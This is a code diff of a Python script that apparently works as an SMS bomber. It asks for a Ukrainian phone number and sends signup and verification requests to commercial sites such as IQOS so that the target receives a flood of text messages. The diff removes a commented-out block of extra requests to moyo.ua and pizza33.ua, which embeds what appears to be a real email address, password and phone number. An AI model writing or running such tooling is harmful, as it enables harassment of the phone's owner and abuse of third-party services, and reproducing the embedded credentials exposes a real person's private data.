@@ -1,5 +1,4 @@
 from user_agent import generate_user_agent
-import threading
 import requests
 
 print(r"""
@@ -21,7 +20,6 @@ bad = str('Запрос на СМС не отправлен')
 
 print('Введите номер без плюса: (380ХХХХХХХХХ):')
 phone = input()
-#phone = ''
 phone_plus = '+' + str(phone)
 cut_phone = str(phone[3:12])
 def run():
@@ -75,17 +73,4 @@ def run():
             print('IQOS: ' + good)
         except Exception:
             print(bad)
-
-        """try:
-            response = requests.post('https://www.moyo.ua/identity/registration', json = {'firstname': last_name, 'phone': phone_plus, 'email': mail}, headers = head)
-            print('Moyo:' + good)
-        except Exception:
-            print(bad)
-        
-        try:
-            response = requests.get('https://pizza33.ua/join/check/?callback=angular.callbacks._1&email=danyasem@gmail.com&password=12r12r1r@gmailcom&phone=0931838888&utm_campaign=&utm_content=&utm_current_visit_started=0&utm_first_visit=0&utm_medium=&utm_previous_visit=0&utm_source=&utm_term=&utm_times_visited=0', data = {'phone': "cut_phone", 'country_code': '380'}, headers = head)
-            print('Parimatch: ' + good)
-        except Exception:
-            print(bad)"""
-
 run()
